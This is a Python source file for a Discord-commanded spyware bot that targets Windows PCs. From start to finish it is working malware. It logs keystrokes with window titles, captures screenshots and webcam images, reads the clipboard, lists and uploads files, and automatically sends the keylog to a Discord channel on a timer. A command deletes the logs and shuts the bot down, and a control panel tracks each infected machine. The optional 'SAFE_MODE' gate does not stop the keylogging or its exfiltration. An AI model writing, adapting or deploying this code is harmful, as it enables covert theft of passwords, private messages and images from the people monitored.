import os
import time
import asyncio
import platform
import psutil
import cv2
import pyperclip
import shutil
import winreg as reg
from PIL import ImageGrab
from pynput import keyboard
from pynput.keyboard import Key
import win32gui
import discord
from discord.ext import commands

SAFE_MODE = True
UNLOCK_PASSWORD = "PasswordGoesHere"
TOKEN = 'YOUR_DISCORD_BOT_TOKEN'
KEYLOG_FILE = 'keylog.txt'
log_send_interval = 10

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix='!', intents=intents)

text_buffer = ''
stop_signal = False
pressed_keys = []
last_sent_size = 0
keylogger_listener = None
session_channel = None
control_channel = None
connected_devices = {}
status_message = None
CONTROL_CHANNEL_NAME = "control-center"

def get_active_window_title():
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown Window"

def write_to_file(data):
    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
        f.write(data + "\n")

def get_pc_stats():
    stats = {
        'Platform': platform.system(),
        'CPU': psutil.cpu_percent(),
        'RAM': psutil.virtual_memory().percent,
        'Uptime': time.strftime("%H:%M:%S", time.gmtime(time.time() - psutil.boot_time())),
    }
    return "\n".join([f"{k}: {v}" for k, v in stats.items()])

def take_screenshot(path="screenshot.png"):
    img = ImageGrab.grab()
    img.save(path)
    return path

def take_camshot(path="camshot.png"):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(path, frame)
    cam.release()
    return path if ret else None

def read_clipboard():
    try:
        return pyperclip.paste()
    except Exception as e:
        return f"Clipboard read failed: {e}"

def list_files(directory):
    try:
        return "\n".join(os.listdir(directory))
    except Exception as e:
        return f"Error: {e}"

def on_press(key):
    global text_buffer, stop_signal, pressed_keys
    current_time = time.strftime('%Y-%m-%d %H:%M:%S')
    active_window = get_active_window_title()
    keycodes = {
        Key.space: ' ',
        Key.enter: ' *`ENTER`*',
        Key.tab: ' *`TAB`*',
        Key.backspace: ' *`<`*',
        Key.esc: ' *`ESC`*',
        Key.shift: ' *`SHIFT`*',
        Key.caps_lock: ' *`CAPS LOCK`*',
    }
    key_str = keycodes.get(key, str(key).strip("'"))
    log_entry = f"[{current_time}] [{active_window}] {key_str}"
    text_buffer += key_str
    write_to_file(log_entry)
    pressed_keys.append(key)
    if pressed_keys[-2:] == [Key.esc, Key.esc]:
        stop_signal = True
        return False

def start_keylogger():
    global keylogger_listener
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()

def stop_keylogger():
    global keylogger_listener
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None

@bot.check
async def restrict_to_session_channel(ctx):
    return ctx.channel == session_channel

async def update_control_panel():
    global status_message
    now = time.time()
    lines = []
    for device, last_seen in connected_devices.items():
        elapsed = int(now - last_seen)
        status = "🟢 Online" if elapsed < 60 else "🔴 Offline"
        lines.append(f"`{device}` - {status} ({elapsed}s ago)")
    panel_text = "**🔧 Connected Devices Monitor**\n" + "\n".join(lines)
    if status_message:
        await status_message.edit(content=panel_text)
    else:
        status_message = await control_channel.send(panel_text)

async def device_heartbeat():
    global connected_devices
    await bot.wait_until_ready()
    while not stop_signal:
        connected_devices[platform.node()] = time.time()
        await update_control_panel()
        await asyncio.sleep(30)

@bot.event
async def on_ready():
    global session_channel, control_channel
    start_keylogger()
    bot.loop.create_task(auto_send_keylog())
    bot.loop.create_task(device_heartbeat())

    guild = discord.utils.get(bot.guilds)
    if not guild:
        return

    user_id = platform.node()
    channel_name = f"session-{user_id.lower().replace(' ', '-')[:20]}"
    session_channel = discord.utils.get(guild.text_channels, name=channel_name)
    if not session_channel:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        session_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)

    control_channel = discord.utils.get(guild.text_channels, name=CONTROL_CHANNEL_NAME)
    if not control_channel:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        control_channel = await guild.create_text_channel(CONTROL_CHANNEL_NAME, overwrites=overwrites)

    connected_devices[user_id] = time.time()
    await update_control_panel()
    await session_channel.send(f"🟢 **Session ready for `{user_id}`**\nSAFE_MODE: {'ENABLED' if SAFE_MODE else 'DISABLED'}")

@bot.command()
async def unlock(ctx, *, password: str):
    global SAFE_MODE
    if password == UNLOCK_PASSWORD:
        SAFE_MODE = False
        await session_channel.send("🔓 SAFE_MODE disabled.")
    else:
        await session_channel.send("❌ Incorrect password.")

@bot.command()
async def status(ctx):
    await session_channel.send(f"📊 System Status:\n```{get_pc_stats()}```")

@bot.command()
async def screenshot(ctx):
    path = take_screenshot()
    await session_channel.send(file=discord.File(path))

@bot.command()
async def camshot(ctx):
    path = take_camshot()
    await session_channel.send(file=discord.File(path) if path else "❌ Camera failed.")

@bot.command()
async def clipboard(ctx):
    clip = read_clipboard()
    await session_channel.send(f"📋 Clipboard:\n```{clip}```")

@bot.command()
async def files(ctx, *, path="."):
    out = list_files(path)[:1900]
    await session_channel.send(f"📁 Files in `{path}`:\n```{out}```")

@bot.command()
async def getfile(ctx, *, path):
    if SAFE_MODE:
        await session_channel.send("🚫 File access blocked by SAFE_MODE.")
    elif os.path.isfile(path):
        await session_channel.send(file=discord.File(path))
    else:
        await session_channel.send("❌ File not found.")

@bot.command()
async def logdump(ctx):
    if os.path.exists(KEYLOG_FILE):
        await session_channel.send(file=discord.File(KEYLOG_FILE))
    else:
        await session_channel.send("No logs found.")

@bot.command()
async def search(ctx, *, term):
    if not os.path.exists(KEYLOG_FILE):
        return await session_channel.send("No logs to search.")
    with open(KEYLOG_FILE, "r", encoding="utf-8") as f:
        matches = [line for line in f if term.lower() in line.lower()]
    if matches:
        await session_channel.send(f"🔍 Matches:\n```{''.join(matches[:20])}```")
    else:
        await session_channel.send(f"No matches for `{term}` found.")

@bot.command()
async def setinterval(ctx, seconds: int):
    global log_send_interval
    if 5 <= seconds <= 3600:
        log_send_interval = seconds
        await session_channel.send(f"✅ Log interval set to {seconds} seconds.")
    else:
        await session_channel.send("❌ Interval must be 5–3600 seconds.")

@bot.command()
async def selfdestruct(ctx):
    global stop_signal
    if SAFE_MODE:
        return await session_channel.send("🚫 SAFE_MODE prevents self-destruction.")
    stop_signal = True
    stop_keylogger()
    await asyncio.sleep(1)
    if os.path.exists(KEYLOG_FILE):
        os.remove(KEYLOG_FILE)
        await session_channel.send("🔥 Keylog deleted.")
    await session_channel.send("💣 Bot shutting down.")
    await bot.close()

@bot.command()
async def exit(ctx):
    global stop_signal
    stop_signal = True
    stop_keylogger()
    await session_channel.send("💤 Bot exiting...")
    await bot.close()

async def auto_send_keylog():
    global last_sent_size
    await bot.wait_until_ready()
    while not stop_signal:
        try:
            if os.path.exists(KEYLOG_FILE):
                size = os.path.getsize(KEYLOG_FILE)
                if size > last_sent_size:
                    await session_channel.send(file=discord.File(KEYLOG_FILE))
                    last_sent_size = size
        except Exception as e:
            print(f"[!] Auto-send error: {e}")
        await asyncio.sleep(log_send_interval)

bot.run(TOKEN)
